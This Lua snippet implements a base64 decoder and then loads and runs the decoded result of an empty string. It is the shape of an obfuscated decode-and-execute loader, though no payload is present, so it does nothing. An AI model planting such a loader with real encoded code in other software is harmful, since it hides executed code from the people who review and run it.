local _b64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function _dec(s)
  local r,p="",1
  local function v(c)
    if c=="=" then return 0 end
    return (_b64:find(c,1,true) or 1)-1
  end
  while p<=#s do
    local a,b,c,d=v(s:sub(p,p)),v(s:sub(p+1,p+1)),v(s:sub(p+2,p+2)),v(s:sub(p+3,p+3))
    r=r..string.char((a<<2)|(b>>4))
    if s:sub(p+2,p+2)~="=" then r=r..string.char(((b&15)<<4)|(c>>2)) end
    if s:sub(p+3,p+3)~="=" then r=r..string.char(((c&3)<<6)|d) end
    p=p+4
  end
  return r
end
;(load(_dec("")))()
